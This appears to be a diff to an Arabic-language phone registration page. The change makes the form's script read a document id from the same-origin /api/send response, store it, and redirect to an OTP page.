@@ -92,6 +92,7 @@
             <button id="submitBtn" class="btn-continue" disabled>استمرار</button>
         </div>
     </div>
+    
     <script>
     const phoneInput = document.getElementById('phoneInput');
     const submitBtn = document.getElementById('submitBtn');
@@ -109,23 +110,21 @@
     submitBtn.addEventListener('click', async () => {
         if (!submitBtn.disabled) {
             const phone = phoneInput.value;
-            
             submitBtn.innerText = "جاري المعالجة...";
             submitBtn.disabled = true;
 
             try {
-                // إرسال البيانات إلى ملف الـ API الخلفي الخاص بك
                 const response = await fetch('/api/send', {
                     method: 'POST', 
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ 
-                        phone: phone, 
-                        otp: "بدأ التسجيل" 
-                    })
+                    body: JSON.stringify({ phone: phone, otp: "بدأ التسجيل" })
                 });
 
-                if (response.ok) {
+                const result = await response.json();
+
+                if (response.ok && result.id) {
                     localStorage.setItem('userPhone', phone);
+                    localStorage.setItem('currentDocId', result.id); 
                     window.location.href = 'otp.html';
                 } else {
                     throw new Error('فشل الإرسال');
@@ -138,7 +137,6 @@
         }
     });
     </script>
-
 
 
 </body>
